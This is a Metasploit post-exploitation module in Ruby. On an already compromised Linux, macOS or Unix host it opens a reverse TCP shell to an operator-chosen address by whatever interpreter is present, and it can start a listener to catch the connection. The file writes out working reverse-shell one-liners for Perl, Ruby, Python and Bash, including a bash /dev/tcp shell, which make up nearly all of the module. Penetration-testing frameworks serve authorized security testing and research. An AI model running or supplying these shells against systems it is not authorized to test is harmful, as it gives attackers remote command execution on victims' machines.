##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Multi Manage System Remote TCP Shell Session',
        'Description'   => %q{
          This module will create a Reverse TCP Shell on the target system
          using the system own scripting enviroments installed on the
          target.
        },
        'License'       => MSF_LICENSE,
        'Author'        => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform'      => %w{ linux osx unix },
        'SessionTypes'  => [ 'meterpreter','shell' ]
      ))
    register_options(
      [
        OptAddress.new('LHOST',
          [true, 'IP of host that will receive the connection from the payload.']),
        OptInt.new('LPORT',
          [false, 'Port for Payload to connect to.', 4433]),
        OptBool.new('HANDLER',
          [ true, 'Start an Exploit Multi Handler to receive the connection', false]),
        OptEnum.new('TYPE', [true, 'Scripting environment on target to use for reverse shell',
          'auto', ['auto','ruby','python','perl','bash']])
      ], self.class)
  end

  # Run Method for when run command is issued
  def run
    create_multihand(datastore['LHOST'],datastore['LPORT']) if datastore['HANDLER']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    cmd = ""

    begin
      case datastore['TYPE']
      when /auto/i
        cmd = auto_create_session(lhost,lport)
      when /ruby/i
        cmd = ruby_session(lhost,lport)
      when /python/i
        cmd = python_session(lhost,lport)
      when /perl/i
        cmd = perl_session(lhost,lport)
      when /bash/i
        cmd = bash_session(lhost,lport)
      end
    rescue
    end

    if not cmd.empty?
      print_status("Executing reverse tcp shel to #{lhost} on port #{lport}")
      session.shell_command_token("(#{cmd} &)")
    end
  end

  # Runs a reverse tcp shell with the scripting environment found
  def auto_create_session(lhost,lport)
    cmd = ""

    if cmd_exec("perl -v") =~ /Larry/
      print_status("Perl was found on target")
      cmd = perl_session(lhost,lport)
      vprint_status("Running #{cmd}")

    elsif cmd_exec("ruby -v") =~ /revision/i
      print_status("Ruby was found on target")
      cmd = ruby_session(lhost,lport)
      vprint_status("Running #{cmd}")

    elsif cmd_exec("python -V") =~ /Python 2\.(\d)/
      print_status("Python was found on target")
      cmd = python_session(lhost,lport)
      vprint_status("Running #{cmd}")

    elsif cmd_exec("bash --version") =~ /GNU bash/
      print_status("Bash was found on target")
      cmd = bash_session(lhost,lport)
      vprint_status("Running #{cmd}")
    else
      print_error("No scripting environment found with which to create a remote reverse TCP Shell with.")
    end

    return cmd
  end

  # Method for checking if a listner for a given IP and port is present
  # will return true if a conflict exists and false if none is found
  def check_for_listner(lhost,lport)
    conflict = false
    client.framework.jobs.each do |k,j|
      if j.name =~ / multi\/handler/
        current_id = j.jid
        current_lhost = j.ctx[0].datastore["LHOST"]
        current_lport = j.ctx[0].datastore["LPORT"]
        if lhost == current_lhost and lport == current_lport.to_i
          print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
          conflict = true
        end
      end
    end
    return conflict
  end

  # Starts a multi/handler session
  def create_multihand(lhost,lport)
    pay = client.framework.payloads.create("generic/shell_reverse_tcp")
    pay.datastore['LHOST'] = lhost
    pay.datastore['LPORT'] = lport
    print_status("Starting exploit multi handler")
    if not check_for_listner(lhost,lport)
      # Set options for module
      mul = client.framework.exploits.create("multi/handler")
      mul.share_datastore(pay.datastore)
      mul.datastore['WORKSPACE'] = client.workspace
      mul.datastore['PAYLOAD'] = "generic/shell_reverse_tcp"
      mul.datastore['EXITFUNC'] = 'thread'
      mul.datastore['ExitOnSession'] = false
      # Validate module options
      mul.options.validate(mul.datastore)
      # Execute showing output
      mul.exploit_simple(
          'Payload'     => mul.datastore['PAYLOAD'],
          'LocalInput'  => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'    => true
        )
    else
      print_error("Could not start handler!")
      print_error("A job is listening on the same Port")
    end
  end

  # Perl reverse TCP Shell
  def perl_session(lhost,lport)
    if cmd_exec("perl -v") =~ /Larry/
      print_status("Perl reverse shell selected")
      cmd = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET " +
        "(PeerAddr,\"#{lhost}:#{lport}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
    else
      print_error("No scripting environment found for the selected type.")
      cmd =""
    end
    return cmd
  end

  # Ruby reverse TCP Shell
  def ruby_session(lhost,lport)
    if cmd_exec("ruby -v") =~ /revision/i
      print_status("Ruby reverse shell selected")
      return "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{lhost}\",\"#{lport}\");" +
        "while(cmd=c.gets);begin;IO.popen(cmd,\"r\"){|io|c.print io.read};rescue;end;end'"
    else
      print_error("No scripting environment found for the selected type.")
      cmd =""
    end
    return cmd
  end

  # Python reverse TCP Shell
  def python_session(lhost,lport)
    if cmd_exec("python -V") =~ /Python 2\.(\d)/
      print_status("Python reverse shell selected")
      return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET," +
        "socket.SOCK_STREAM);s.connect((\"#{lhost}\",#{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);" +
        "os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    else
      print_error("No scripting environment found for the selected type.")
      cmd =""
    end
    return cmd
  end

  # Bash reverse TCP Shell
  def bash_session(lhost,lport)
    if cmd_exec("bash --version") =~ /GNU bash/
      print_status("Bash reverse shell selected")
      return "bash -c 'nohup bash -i >& /dev/tcp/#{lhost}/#{lport} 0>&1'"
    else
      print_error("No scripting environment found for the selected type.")
      cmd =""
    end
    return cmd
  end
end
